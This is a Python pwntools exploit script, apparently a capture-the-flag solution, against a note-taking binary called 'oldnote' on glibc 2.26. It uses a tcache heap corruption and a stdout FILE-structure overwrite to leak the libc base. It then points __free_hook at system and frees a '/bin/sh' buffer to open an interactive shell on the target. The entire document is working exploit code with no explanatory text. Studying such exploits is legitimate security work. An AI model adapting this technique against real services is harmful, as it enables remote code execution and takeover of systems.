from pwn import *

e = ELF("./oldnote")
libc = ELF("./libc-2.26.so")
ld = ELF("./ld-2.26.so")

context.binary = e
context.terminal = ["termite", "-e"]

while True:
    # p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
    p = remote("localhost", 10111)


    def new(size, dat):
        p.sendlineafter(": ", "1")
        p.sendlineafter(": ", str(size))
        p.sendafter(": ", str(dat))


    def remove(idx):
        p.sendlineafter(": ", "2")
        p.sendlineafter(": ", str(idx))


    pause()
    new(0x10, "A")
    new(0x10, "B")

    for i in range(0x90, 0xd1, 0x10):
        new(i, "i")
        remove(2)

    new(0xe0, "i" * 0x30 + p64(0x421) + p64(0xe0 - 0x32 + 3))

    remove(0)

    new(-1, "C" * 0x18 + "\x21\x04")

    remove(1)

    # tcache for 0x20 is empty so get a chunk in there to pull later
    new(20, "A")
    remove(1)

    new(-1, "A" * 16 + p64(0x21) + p64(0x400) + "\x20\xe7")

    remove(0)

    new(144, "A")

    new(144, p64(0xfbad1800) + p64(0) * 3 + "\x00")

    try:
        dat = p.recvline()
        libc.address = u64(dat[24:32]) - 0x3d73e0
    except struct.error:
        print("skip")
        continue
    except EOFError:
        print("asdf")
        continue

    print("libc base", hex(libc.address))

    remove(0)

    new(0xe0, "iiiiiiii")

    remove(0)

    print("libc free hook", hex(libc.sym["__free_hook"]))
    print("libc system", hex(libc.sym["system"]))

    new(0xf0, "B" * 0x50 + p64(0) + p64(0xc1) + p64(libc.sym["__free_hook"]))

    remove(0)

    new(0xb0, "/bin/sh")

    remove(1)

    new(0xb0, p64(libc.sym["system"]))

    remove(0)

    p.interactive()
